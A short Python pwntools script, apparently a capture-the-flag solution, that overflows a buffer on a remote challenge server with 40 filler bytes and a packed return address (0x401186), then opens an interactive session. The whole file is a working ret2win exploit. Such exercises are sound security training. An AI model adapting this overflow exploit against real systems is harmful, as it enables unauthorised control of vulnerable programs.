from pwn import *

p = remote('cyberchallenge.disi.unitn.it', 9002)

offset = 40
target = 0x0000000000401186

payload = b'A'*offset + p64(target)

p.sendline(payload)
p.interactive()